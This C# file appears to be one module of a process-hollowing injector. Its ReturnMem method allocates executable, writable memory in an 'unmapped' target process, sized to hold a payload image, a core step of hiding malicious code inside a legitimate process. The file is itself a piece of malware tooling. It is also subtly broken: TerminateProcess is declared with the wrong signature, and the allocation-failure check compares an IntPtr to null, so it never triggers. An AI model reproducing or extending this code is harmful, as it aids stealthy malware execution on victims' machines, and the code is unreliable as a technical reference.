using System;
using System.Runtime.InteropServices;
using MakeProc;

namespace GetMem
{
    public static class GetMem
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool TerminateProcess(IntPtr hProcess);

        public const uint PAGE_EXECUTE_READWRITE = 0x40;
        public const uint MEM_COMMIT = 0x00001000;
        public const uint MEM_RESERVE = 0x00002000;

        public static IntPtr ReturnMem(PROCESS_INFORMATION procInfo, int SizeOfImage)
        {
            // Allocate memory in the unmapped process; size must be SizeOfImage of payload; validate success:
            IntPtr nemM = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero, (uint)SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (nemM == null)
            {
                Console.WriteLine("Could not allocate memory in the target process.");
                TerminateProcess(procInfo.hProcess);
                Environment.Exit(1);
            }
            Console.WriteLine("Successful memory allocation.");
            return nemM;
        }
    }
}
